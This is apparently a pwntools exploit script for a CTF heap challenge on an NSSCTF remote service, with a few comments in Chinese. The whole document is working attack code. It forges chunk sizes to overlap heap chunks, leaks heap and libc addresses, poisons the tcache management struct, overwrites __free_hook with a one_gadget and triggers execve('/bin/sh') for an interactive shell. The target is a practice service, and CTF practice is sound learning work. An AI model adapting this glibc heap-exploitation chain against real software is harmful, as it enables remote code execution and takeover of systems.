from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28240)
# io=process("./service")
elf=ELF("./service")
libc=ELF("./libc-2.27.so")

def add(s):
    io.sendlineafter(b"choice: ",b"A")
    io.sendlineafter(b"size?",str(s))
    
def edit(n,cc):
    io.sendlineafter(b"choice: ",b"E")
    io.sendlineafter(b"idx?",str(n))
    io.sendlineafter(b"content:",cc)
    
def show(n):
    io.sendlineafter(b"choice: ",b"S")
    io.sendlineafter(b"idx?",str(n))
    
def delete(n):
    io.sendlineafter(b"choice: ",b"D")
    io.sendlineafter(b"idx?",str(n))

# gdb.attach(io)
# pause()

add(0x18) #0
add(0x18) #1
add(0x78) #2
add(0x10) #3

edit(0,cyclic(0x18)+p64(0x61))
delete(1)   
delete(2)
# edit(0,cyclic(0x18)+p64(0x81))
add(0x50) #1 #下标复用，按照delete顺序复用
edit(1,b"a"*0x27+b"b")
show(1)
io.recvuntil(b"b")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x10 #泄露堆地址
print("heap_addr: "+hex(heap_addr))

edit(1,b"a"*0x18+p64(0x81)+p64(heap_addr+0x10)+p64(0))
add(0x78) #2
add(0x78) #4
edit(4,b"\x07"*0x40+p64(0)*6+p64(heap_addr+0x10))
delete(4)
add(0x78) #4
show(4)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"] #泄露libc地址
print("leak_addr: "+hex(leak_addr))

free_hook=leak_addr+libc.sym[b"__free_hook"]
malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=leak_addr+one_gadget[1]

edit(4,b"\x02"*0x40+p64(0)*3+p64(free_hook))
add(0x40) #5  
edit(5,p64(shell)) #劫持free_hook打one_gadget

delete(5) #trigger

io.interactive()

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL